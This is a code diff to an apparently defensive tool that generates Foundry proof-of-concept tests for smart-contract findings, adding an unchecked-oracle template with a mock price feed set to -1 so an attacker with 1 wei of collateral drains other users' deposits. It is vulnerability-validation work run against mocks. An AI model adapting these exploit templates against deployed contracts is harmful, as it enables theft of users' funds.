@@ -7,10 +7,10 @@ import type { Candidate, ContractFunction, ContractInfo } from "./types.js";
  * decided only by running the test on vulnerable and fixed code.
  */
 export const TEMPLATE_VERSION = "1";
-export type TemplateId = "access-control-drain" | "reentrancy-eth" | "initializer-takeover";
+export type TemplateId = "access-control-drain" | "reentrancy-eth" | "initializer-takeover" | "oracle-unchecked-price";
 
 export const SLOT_EXPRESSION =
-  /^(owner|attacker|victim|address\(token\)|address\(this\)|SEED|ATTACK|address\(target\)\.balance|\d{1,30}( ether| gwei| wei)?|true|false|""|hex""|bytes32\(0\)|makeAddr\("pramaan\.[a-z0-9_.]{1,40}"\))$/;
+  /^(owner|attacker|victim|address\(token\)|address\(feed\)|address\(this\)|SEED|ATTACK|address\(target\)\.balance|\d{1,30}( ether| gwei| wei)?|true|false|""|hex""|bytes32\(0\)|makeAddr\("pramaan\.[a-z0-9_.]{1,40}"\))$/;
 
 export interface TargetConfig {
   deploy?: { kind: "direct" | "proxy"; constructorArgs?: string[]; initializer?: string; initializerArgs?: string[] };
@@ -32,7 +32,7 @@ export interface ExploitPlan {
   version: string;
   filledBy: "heuristics" | "config" | "ai";
   target: { name: string; source: string };
-  deploy: { kind: "direct" | "proxy"; ctorArgs: string[]; initializer: { name: string; args: string[] } | null };
+  deploy: { kind: "direct" | "proxy"; ctorArgs: string[]; initializer: { name: string; args: string[] } | null; /** constructor takes contract-typed parameters: deploy through creationCode + abi.encode (address and contract types share an ABI encoding) */ lowLevelCreate?: boolean };
   fund: { fn: string | null; valueExpr: string };
   attack: { fn: string; args: string[] };
   drain: { fn: string; args: string[] } | null;
@@ -77,6 +77,7 @@ function argFor(param: { name: string; type: string }, role: "deploy" | "attack"
   if (t === "address") {
     if (role === "attack") return "attacker";
     if (/owner|admin|governance|governor|guardian|manager|authority/.test(n)) return "owner";
+    if (/oracle|feed|aggregator/.test(n)) return "address(feed)";
     if (/token|asset|underlying|erc20|currency|stable/.test(n) || /^contract /.test(param.type)) return "address(token)";
     return `makeAddr("pramaan.${n.replace(/[^a-z0-9_]/g, "") || "param"}")`;
   }
@@ -130,7 +131,7 @@ function planDeploy(c: ContractInfo, cfg: TargetConfig | undefined): { ok: true;
   }
   const ctorArgs = argsFor(ctor?.parameters ?? [], "deploy");
   if (!ctorArgs) return { ok: false, reason: `cannot choose constructor arguments for ${c.name}` };
-  return { ok: true, fromConfig: false, deploy: { kind: "direct", ctorArgs, initializer: null } };
+  return { ok: true, fromConfig: false, deploy: { kind: "direct", ctorArgs, initializer: null, ...(ctor?.parameters.some((p) => /^contract /.test(p.type)) ? { lowLevelCreate: true } : {}) } };
 }
 
 function planFund(c: ContractInfo, cfg: TargetConfig | undefined): { fn: string | null; valueExpr: string } | null {
@@ -170,6 +171,7 @@ export function templateFor(candidate: Candidate): TemplateId | null {
   if (candidate.vulnClass === "access-control") return "access-control-drain";
   if (candidate.vulnClass === "reentrancy") return "reentrancy-eth";
   if (candidate.vulnClass === "unprotected-initializer") return "initializer-takeover";
+  if (candidate.vulnClass === "unchecked-oracle") return "oracle-unchecked-price";
   return null;
 }
 
@@ -219,6 +221,24 @@ export function planExploit(input: PlanInput): PlanResult {
         hypothesis: `${contract.name}.${sig} sends ETH before updating the caller's balance, so a contract can re-enter it.`,
         property: "No account may withdraw more ETH than it deposited.",
         preconditions: [`a victim has deposited SEED (10 ether) via ${fund.fn}`, "the attacker deposits only ATTACK (1 ether)"],
+      },
+    };
+  }
+
+  if (templateId === "oracle-unchecked-price") {
+    const feedInjected = [...deploy.deploy.ctorArgs, ...(deploy.deploy.initializer?.args ?? [])].includes("address(feed)");
+    if (!feedInjected) return { ok: false, reason: `${contract.name} does not take its price feed as a constructor or initializer address, so the template cannot substitute a feed`, needs: ["deploy"] };
+    if (!fund || !fund.fn) return { ok: false, reason: `oracle template needs a payable deposit function on ${contract.name} (the attacker posts 1 wei of collateral)`, needs: ["fund"] };
+    const args = argsFor(fn.parameters, "attack");
+    if (!args) return { ok: false, reason: `cannot choose attacker arguments for ${sig}`, needs: ["attack"] };
+    return {
+      ok: true,
+      plan: {
+        templateId, version: TEMPLATE_VERSION, filledBy, target, deploy: deploy.deploy, fund,
+        attack: { fn: fn.name, args }, drain: null, hasOwnerGetter: hasOwnerGetter(contract),
+        hypothesis: `${contract.name}.${sig} uses the price feed's answer without checking that it is positive, so a non-positive answer (cast to uint256) becomes an enormous price.`,
+        property: "A feed that returns a non-positive answer must not let an account holding 1 wei of collateral take ETH that other users deposited.",
+        preconditions: [`a victim has deposited SEED (10 ether) via ${fund.fn}`, "the attacker holds 1 wei of collateral", "the feed reports an invalid round (answer = -1) after having reported a healthy price"],
       },
     };
   }
@@ -323,6 +343,34 @@ contract PramaanMockToken {
 }
 `;
 
+const FEED_HELPER = `
+/// Chainlink-style price feed whose answer the test controls. It models a FEED FAILURE (invalid round, circuit-breaker
+/// value, compromised aggregator); it is not something the attacker could do on a healthy feed.
+contract PramaanMockFeed {
+    uint8 public constant decimals = 8;
+    int256 public answer;
+    uint256 public updatedAt;
+
+    constructor(int256 initialAnswer) {
+        answer = initialAnswer;
+        updatedAt = block.timestamp;
+    }
+
+    function set(int256 newAnswer) external {
+        answer = newAnswer;
+        updatedAt = block.timestamp;
+    }
+
+    function latestAnswer() external view returns (int256) {
+        return answer;
+    }
+
+    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {
+        return (1, answer, updatedAt, updatedAt, 1);
+    }
+}
+`;
+
 function attackerHelper(plan: ExploitPlan): string {
   const call = `target.${plan.attack.fn}(${plan.attack.args.map((a) => (a === "ATTACK" ? "step" : a)).join(", ")})`;
   return `
@@ -374,7 +422,9 @@ export function renderExploit(plan: ExploitPlan, opts: RenderOptions): string {
   const usesToken = [...plan.deploy.ctorArgs, ...(plan.deploy.initializer?.args ?? [])].includes("address(token)");
   const name = testContractName(opts.findingId, opts.suffix);
   const setup: string[] = [];
+  const usesFeed = plan.templateId === "oracle-unchecked-price" || [...plan.deploy.ctorArgs, ...(plan.deploy.initializer?.args ?? [])].includes("address(feed)");
   if (usesToken) setup.push("token = new PramaanMockToken();");
+  if (usesFeed) setup.push("feed = new PramaanMockFeed(2000e8);"); // a healthy ETH/USD-style price
   setup.push("vm.startPrank(owner);");
   if (plan.deploy.kind === "proxy") {
     const init = plan.deploy.initializer;
@@ -382,7 +432,15 @@ export function renderExploit(plan: ExploitPlan, opts: RenderOptions): string {
     setup.push("PramaanTarget implementation = new PramaanTarget();");
     setup.push(`target = PramaanTarget(payable(address(new PramaanProxy(address(implementation), ${data}))));`);
   } else {
-    setup.push(`target = new PramaanTarget(${plan.deploy.ctorArgs.join(", ")});`);
+    if (plan.deploy.lowLevelCreate) {
+      setup.push(`bytes memory pramaanInit = abi.encodePacked(type(PramaanTarget).creationCode, abi.encode(${plan.deploy.ctorArgs.join(", ")}));`);
+      setup.push("address pramaanDeployed;");
+      setup.push("assembly { pramaanDeployed := create(0, add(pramaanInit, 0x20), mload(pramaanInit)) }");
+      setup.push('require(pramaanDeployed != address(0), "Pramaan: deployment failed");');
+      setup.push("target = PramaanTarget(payable(pramaanDeployed));");
+    } else {
+      setup.push(`target = new PramaanTarget(${plan.deploy.ctorArgs.join(", ")});`);
+    }
     if (plan.deploy.initializer) setup.push(`${call(plan.deploy.initializer.name, plan.deploy.initializer.args)};`);
   }
   setup.push("vm.stopPrank();");
@@ -421,6 +479,20 @@ export function renderExploit(plan: ExploitPlan, opts: RenderOptions): string {
       'assertGt(exploit.reentries(), 0, "Pramaan: the target was never re-entered");',
       'assertGt(address(exploit).balance, ATTACK, "Pramaan: the attacker withdrew more ETH than it deposited");',
     );
+  } else if (plan.templateId === "oracle-unchecked-price") {
+    attack.push(
+      "vm.deal(attacker, ATTACK);",
+      "vm.prank(attacker);",
+      `target.${plan.fund.fn}{value: 1}();`, // 1 wei of collateral: enough to be a customer, worthless at a sane price
+      "vm.prank(attacker);",
+      "feed.set(-1);", // the feed reports an invalid round
+      "uint256 attackerBefore = attacker.balance;",
+      "vm.prank(attacker);",
+      `${call(plan.attack.fn, plan.attack.args)};`,
+      "uint256 gained = attacker.balance - attackerBefore;",
+      'emit log_named_uint("pramaan.attacker_gain", gained);',
+      'assertGe(gained, SEED, "Pramaan: a non-positive oracle answer let an account with 1 wei of collateral take ETH other users deposited");',
+    );
   } else {
     attack.push("uint256 attackerBefore = attacker.balance;", "vm.startPrank(attacker);", `${call(plan.attack.fn, plan.attack.args)};`);
     if (plan.drain) attack.push(`${call(plan.drain.fn, plan.drain.args)};`);
@@ -435,7 +507,7 @@ export function renderExploit(plan: ExploitPlan, opts: RenderOptions): string {
     }
   }
 
-  const helpers = [plan.deploy.kind === "proxy" ? PROXY_HELPER : "", usesToken ? TOKEN_HELPER : "", plan.templateId === "reentrancy-eth" ? attackerHelper(plan) : ""].join("");
+  const helpers = [plan.deploy.kind === "proxy" ? PROXY_HELPER : "", usesToken ? TOKEN_HELPER : "", usesFeed ? FEED_HELPER : "",plan.templateId === "reentrancy-eth" ? attackerHelper(plan) : ""].join("");
   return `// SPDX-License-Identifier: UNLICENSED
 // Generated by Pramaan for finding ${opts.findingId}: template ${plan.templateId}@${plan.version}, slots filled by ${plan.filledBy}.
 // Hypothesis: ${plan.hypothesis}
@@ -448,7 +520,7 @@ import {${plan.target.name} as PramaanTarget} from "${plan.target.source}";
 ${helpers}
 contract ${name} is Test {
     PramaanTarget internal target;
-${usesToken ? "    PramaanMockToken internal token;\n" : ""}    address internal owner = makeAddr("pramaan.owner");
+${usesToken ? "    PramaanMockToken internal token;\n" : ""}${usesFeed ? "    PramaanMockFeed internal feed;\n" : ""}    address internal owner = makeAddr("pramaan.owner");
     address internal victim = makeAddr("pramaan.victim");
     address internal attacker = makeAddr("pramaan.attacker");
     uint256 internal constant SEED = 10 ether;
